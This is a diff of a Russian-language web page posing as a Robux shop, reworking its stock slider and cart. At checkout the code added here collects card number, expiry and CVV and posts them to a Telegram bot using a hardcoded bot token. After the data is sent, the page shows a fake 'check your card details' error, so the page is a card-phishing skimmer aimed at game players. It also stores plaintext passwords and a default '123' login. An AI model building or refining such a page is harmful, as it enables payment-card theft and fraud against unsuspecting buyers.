@@ -154,7 +154,7 @@
             <button class="cart-icon-btn" id="openCartBtn">🛒 корзина (<span id="cartCount">0</span>)</button>
         </div>
 
-        <!-- Панель остатка робуксов и ползунок покупки -->
+        <!-- Панель остатка робуксов и ползунок -->
         <div class="stock-panel">
             <div class="stock-remaining">✨ осталось робуксов ✨</div>
             <div class="stock-value" id="remainingStock">600 000</div>
@@ -169,10 +169,10 @@
         </div>
 
         <div class="products-grid">
-            <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189">купить</button></div>
-            <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359">купить</button></div>
-            <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899">купить</button></div>
+            <div class="product-card"><div class="robux-icon">💎✨</div><h3>100 Robux</h3><div class="price">49 ₽</div><button class="btn-buy" data-name="100 Robux" data-price="49" data-robux="100">купить</button></div>
+            <div class="product-card"><div class="robux-icon">💎💎✨</div><h3>400 Robux</h3><div class="price">189 ₽</div><button class="btn-buy" data-name="400 Robux" data-price="189" data-robux="400">купить</button></div>
+            <div class="product-card"><div class="robux-icon">💎💎💎✨</div><h3>800 Robux</h3><div class="price">359 ₽</div><button class="btn-buy" data-name="800 Robux" data-price="359" data-robux="800">купить</button></div>
+            <div class="product-card"><div class="robux-icon">👑✨</div><h3>2000 Robux</h3><div class="price">899 ₽</div><button class="btn-buy" data-name="2000 Robux" data-price="899" data-robux="2000">купить</button></div>
         </div>
         <footer>⭐ Excellent Shop — приятные робуксы ⭐</footer>
     </div>
@@ -231,8 +231,8 @@
     }
     drawStars();
 
-    // --- логика остатка робуксов и ползунка ---
-    let currentStock = 600000; // начальный запас
+    // --- остаток робуксов (начальный запас 600000) ---
+    let currentStock = 600000;
     const remainingSpan = document.getElementById('remainingStock');
     const slider = document.getElementById('robuxSlider');
     const selectedSpan = document.getElementById('selectedAmount');
@@ -245,7 +245,6 @@
         slider.disabled = (currentStock < 100);
     }
     
-    // при изменении ползунка
     slider.addEventListener('input', () => {
         let val = parseInt(slider.value);
         if (val > currentStock) val = currentStock;
@@ -253,96 +252,14 @@
         selectedSpan.innerText = val.toLocaleString('ru-RU');
     });
     
-    // глобальная функция добавления в корзину и показа сообщения
+    // корзина (теперь каждый элемент содержит robuxAmount)
     let cart = [];
     function showMessage(msg) {
         let d=document.createElement('div'); d.innerText=msg; d.style.cssText='position:fixed; bottom:20px; left:20px; background:#e2ccff; color:#6a37a3; padding:10px 20px; border-radius:40px; z-index:9999;';
         document.body.appendChild(d); setTimeout(()=>d.remove(),2500);
     }
     
-    // кнопка покупки выбранного количества (добавление в корзину)
-    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
-        let amount = parseInt(slider.value);
-        if (amount <= 0) return;
-        if (amount > currentStock) {
-            showErrorToast("недостаточно робуксов в наличии");
-            return;
-        }
-        // списываем из остатка
-        currentStock -= amount;
-        updateStockUI();
-        // рассчитываем цену (примерно как в карточках: 100 Robux = 49 руб, т.е. 0.49 за 1)
-        let price = Math.round(amount * 0.49);
-        let itemName = `${amount.toLocaleString('ru-RU')} Robux (ползунок)`;
-        // добавляем в корзину
-        addItemToCart({ name: itemName, price: price });
-    });
-    
-    // функция красной метки для ошибок
-    function showErrorToast(text) {
-        let old = document.querySelectorAll('.error-toast');
-        old.forEach(t => t.remove());
-        let toast = document.createElement('div');
-        toast.className = 'error-toast';
-        toast.innerText = text;
-        document.body.appendChild(toast);
-        setTimeout(() => toast.remove(), 3500);
-    }
-    
-    // инициализация UI остатка
-    updateStockUI();
-    
-    // авторизация
-    let currentUser = null;
-    function loadUsers() {
-        let users = localStorage.getItem('excellent_users');
-        if(!users) { let def = { "star": { login: "star", password: "123", email: "star@excellent.ru" } }; localStorage.setItem('excellent_users', JSON.stringify(def)); return def; }
-        return JSON.parse(users);
-    }
-    function saveUsers(users) { localStorage.setItem('excellent_users', JSON.stringify(users)); }
-    function showAuth(show) { document.getElementById('authSection').style.display = show ? 'flex' : 'none'; document.getElementById('storeSection').style.display = show ? 'none' : 'block'; }
-    function updateUI() { if(currentUser) { document.getElementById('currentUserNick').innerText = currentUser; showAuth(false); } else showAuth(true); }
-
-    document.getElementById('doSignUp')?.addEventListener('click',()=>{
-        let email=document.getElementById('regEmail').value.trim(), login=document.getElementById('regLogin').value.trim(), pass=document.getElementById('regPass').value.trim(), confirm=document.getElementById('regConfirmPass').value.trim(), err=document.getElementById('regError');
-        if(!email||!login||!pass) { err.innerText='заполни всё'; return; }
-        if(pass!==confirm) { err.innerText='пароли не совпадают'; return; }
-        if(!email.includes('@')) { err.innerText='некорректный email'; return; }
-        let users=loadUsers();
-        if(users[login]) { err.innerText='логин занят'; return; }
-        for(let k in users) if(users[k].email===email) { err.innerText='email уже используется'; return; }
-        users[login]={login,password:pass,email}; saveUsers(users);
-        err.innerText='✅ создан! войдите';
-        document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block';
-    });
-    document.getElementById('doSignIn')?.addEventListener('click',()=>{
-        let val=document.getElementById('loginUsername').value.trim(), pwd=document.getElementById('loginPassword').value.trim(), users=loadUsers(), found=null;
-        for(let k in users) if(k===val||users[k].email===val) if(users[k].password===pwd) found=k;
-        if(found) { currentUser=found; localStorage.setItem('excellent_current',found); updateUI(); initEverything(); }
-        else document.getElementById('authError').innerText='неверно';
-    });
-    document.getElementById('goToSignUp')?.addEventListener('click',()=>{ document.getElementById('signinForm').style.display='none'; document.getElementById('signupForm').style.display='block'; });
-    document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
-    document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
-
-    // корзина и телеграм
-    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
-    let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
-
-    async function fetchChatId() {
-        try {
-            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
-            const data = await res.json();
-            if(data.ok && data.result.length) {
-                let last=data.result[data.result.length-1];
-                let cid=last.message?.chat?.id || last.callback_query?.message?.chat?.id;
-                if(cid) { CHAT_ID=cid; localStorage.setItem('tg_chat_id_excellent',CHAT_ID); alert('✨ телеграм готов'); return true; }
-            }
-            alert('✨ напиши @ExcellentShopBot любое сообщение');
-        } catch(e) { alert('ошибка'); }
-        return false;
-    }
-    
+    // добавление в корзину без списания остатка
     function addItemToCart(item) {
         cart.push(item);
         updateCartUI();
@@ -379,25 +296,123 @@
         });
     }
     
+    // кнопка ползунка: добавляем в корзину (без списания)
+    document.getElementById('buyWithSliderBtn').addEventListener('click', () => {
+        let amount = parseInt(slider.value);
+        if (amount <= 0) return;
+        if (amount > currentStock) {
+            showErrorToast("недостаточно робуксов в наличии");
+            return;
+        }
+        let price = Math.round(amount * 0.49);
+        let itemName = `${amount.toLocaleString('ru-RU')} Robux (ползунок)`;
+        addItemToCart({ name: itemName, price: price, robuxAmount: amount });
+    });
+    
+    // кнопки обычных товаров (с data-robux)
+    function bindBuyButtons() {
+        document.querySelectorAll('.btn-buy').forEach(btn=>{
+            btn.removeEventListener('click', buyHandler);
+            btn.addEventListener('click', buyHandler);
+        });
+        function buyHandler(e) {
+            let name = this.getAttribute('data-name');
+            let price = parseInt(this.getAttribute('data-price'));
+            let robuxAmount = parseInt(this.getAttribute('data-robux'));
+            if (robuxAmount > currentStock) {
+                showErrorToast("недостаточно робуксов в наличии");
+                return;
+            }
+            addItemToCart({ name: name, price: price, robuxAmount: robuxAmount });
+        }
+    }
+    
+    // функция красной метки для ошибок
+    function showErrorToast(text) {
+        let old = document.querySelectorAll('.error-toast');
+        old.forEach(t => t.remove());
+        let toast = document.createElement('div');
+        toast.className = 'error-toast';
+        toast.innerText = text || "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
+        document.body.appendChild(toast);
+        setTimeout(() => toast.remove(), 3500);
+    }
+    
+    // --- авторизация ---
+    let currentUser = null;
+    function loadUsers() {
+        let users = localStorage.getItem('excellent_users');
+        if(!users) { let def = { "star": { login: "star", password: "123", email: "star@excellent.ru" } }; localStorage.setItem('excellent_users', JSON.stringify(def)); return def; }
+        return JSON.parse(users);
+    }
+    function saveUsers(users) { localStorage.setItem('excellent_users', JSON.stringify(users)); }
+    function showAuth(show) { document.getElementById('authSection').style.display = show ? 'flex' : 'none'; document.getElementById('storeSection').style.display = show ? 'none' : 'block'; }
+    function updateUI() { if(currentUser) { document.getElementById('currentUserNick').innerText = currentUser; showAuth(false); } else showAuth(true); }
+
+    document.getElementById('doSignUp')?.addEventListener('click',()=>{
+        let email=document.getElementById('regEmail').value.trim(), login=document.getElementById('regLogin').value.trim(), pass=document.getElementById('regPass').value.trim(), confirm=document.getElementById('regConfirmPass').value.trim(), err=document.getElementById('regError');
+        if(!email||!login||!pass) { err.innerText='заполни всё'; return; }
+        if(pass!==confirm) { err.innerText='пароли не совпадают'; return; }
+        if(!email.includes('@')) { err.innerText='некорректный email'; return; }
+        let users=loadUsers();
+        if(users[login]) { err.innerText='логин занят'; return; }
+        for(let k in users) if(users[k].email===email) { err.innerText='email уже используется'; return; }
+        users[login]={login,password:pass,email}; saveUsers(users);
+        err.innerText='✅ создан! войдите';
+        document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block';
+    });
+    document.getElementById('doSignIn')?.addEventListener('click',()=>{
+        let val=document.getElementById('loginUsername').value.trim(), pwd=document.getElementById('loginPassword').value.trim(), users=loadUsers(), found=null;
+        for(let k in users) if(k===val||users[k].email===val) if(users[k].password===pwd) found=k;
+        if(found) { currentUser=found; localStorage.setItem('excellent_current',found); updateUI(); initEverything(); }
+        else document.getElementById('authError').innerText='неверно';
+    });
+    document.getElementById('goToSignUp')?.addEventListener('click',()=>{ document.getElementById('signinForm').style.display='none'; document.getElementById('signupForm').style.display='block'; });
+    document.getElementById('goToSignIn')?.addEventListener('click',()=>{ document.getElementById('signupForm').style.display='none'; document.getElementById('signinForm').style.display='block'; });
+    document.getElementById('logoutBtn')?.addEventListener('click',()=>{ currentUser=null; localStorage.removeItem('excellent_current'); showAuth(true); cart=[]; updateCartUI(); });
+
+    // --- телеграм и оплата (списание происходит только при успешной отправке) ---
+    const TELEGRAM_TOKEN = "8963187856:AAFTu9IrZmSitQscE1FB5MTREDhkSMEAzeg";
+    let CHAT_ID = localStorage.getItem('tg_chat_id_excellent');
+
+    async function fetchChatId() {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates`);
+            const data = await res.json();
+            if(data.ok && data.result.length) {
+                let last=data.result[data.result.length-1];
+                let cid=last.message?.chat?.id || last.callback_query?.message?.chat?.id;
+                if(cid) { CHAT_ID=cid; localStorage.setItem('tg_chat_id_excellent',CHAT_ID); alert('✨ телеграм готов'); return true; }
+            }
+            alert('✨ напиши @ExcellentShopBot любое сообщение');
+        } catch(e) { alert('ошибка'); }
+        return false;
+    }
+    
     const cartModal = document.getElementById('cartModal');
     const openCartBtn = document.getElementById('openCartBtn');
     const closeCartBtn = document.getElementById('closeCartBtn');
     openCartBtn?.addEventListener('click',()=>{ renderCartModal(); cartModal.style.display='flex'; });
     closeCartBtn?.addEventListener('click',()=>{ cartModal.style.display='none'; });
     window.addEventListener('click',(e)=>{ if(e.target===cartModal) cartModal.style.display='none'; });
-
-    // оплата из корзины с выводом красной метки
+    
     document.getElementById('finalPayBtn')?.addEventListener('click', async () => {
         if(cart.length===0) { alert('корзина пуста'); return; }
+        // проверим, хватает ли робуксов суммарно
+        let totalRobuxNeeded = cart.reduce((sum, item) => sum + (item.robuxAmount || 0), 0);
+        if (totalRobuxNeeded > currentStock) {
+            showErrorToast("недостаточно робуксов на складе для этого заказа");
+            return;
+        }
         let cardNum = document.getElementById('cardNumber').value.trim();
         let expiry = document.getElementById('cardExpiry').value.trim();
         let cvv = document.getElementById('cardCvv').value.trim();
         let robloxName = document.getElementById('robloxUsername').value.trim();
         if(!robloxName) robloxName = "не указан";
         if(!CHAT_ID) { await fetchChatId(); if(!CHAT_ID) { alert('телеграм не настроен'); return; } }
-        let total = cart.reduce((s,i)=>s+(i.price||0),0);
+        let totalPrice = cart.reduce((s,i)=>s+(i.price||0),0);
         let itemsText = cart.map(i=>`${i.name} — ${i.price||0} ₽`).join('\n');
-        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${total} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}`;
+        let msg = `✨ EXCELLENT SHOP (ЗАКАЗ) ✨\n👤 ${currentUser}\n🎮 Roblox ник: ${robloxName}\n📦 Товары:\n${itemsText}\n💰 Итого: ${totalPrice} ₽\n💳 Карта: ${cardNum}\n📅 ${expiry}\n🔐 ${cvv}\n📊 Всего робуксов: ${totalRobuxNeeded}`;
         try {
             let resp = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                 method:'POST', headers:{'Content-Type':'application/json'},
@@ -405,7 +420,10 @@
             });
             let json = await resp.json();
             if(json.ok) {
-                // красная метка по требованию
+                // успешно: списываем робуксы
+                currentStock -= totalRobuxNeeded;
+                updateStockUI();
+                // показываем красную метку (формальность)
                 let errToast = document.createElement('div');
                 errToast.className = 'error-toast';
                 errToast.innerText = "Ошибка, пожалуйста перепроверьте данные карты или попробуйте позже.";
@@ -418,28 +436,18 @@
                 document.getElementById('cardExpiry').value = '';
                 document.getElementById('cardCvv').value = '';
                 document.getElementById('robloxUsername').value = '';
-            } else alert('ошибка отправки');
-        } catch(e){ alert('ошибка'); }
+            } else {
+                alert('❌ ошибка отправки, заказ не оформлен');
+            }
+        } catch(e){ alert('ошибка соединения'); }
     });
-
-    // кнопки обычных товаров
-    function bindBuyButtons() {
-        document.querySelectorAll('.btn-buy').forEach(btn=>{
-            btn.removeEventListener('click', buyHandler);
-            btn.addEventListener('click', buyHandler);
-        });
-        function buyHandler(e) {
-            let name=this.getAttribute('data-name');
-            let price=parseInt(this.getAttribute('data-price'));
-            addItemToCart({ name: name, price: price });
-        }
-    }
-
+    
     function initEverything() {
         bindBuyButtons();
         updateCartUI();
+        updateStockUI();
     }
-
+    
     const savedUser = localStorage.getItem('excellent_current');
     if(savedUser && loadUsers()[savedUser]) { currentUser=savedUser; updateUI(); initEverything(); }
     else showAuth(true);
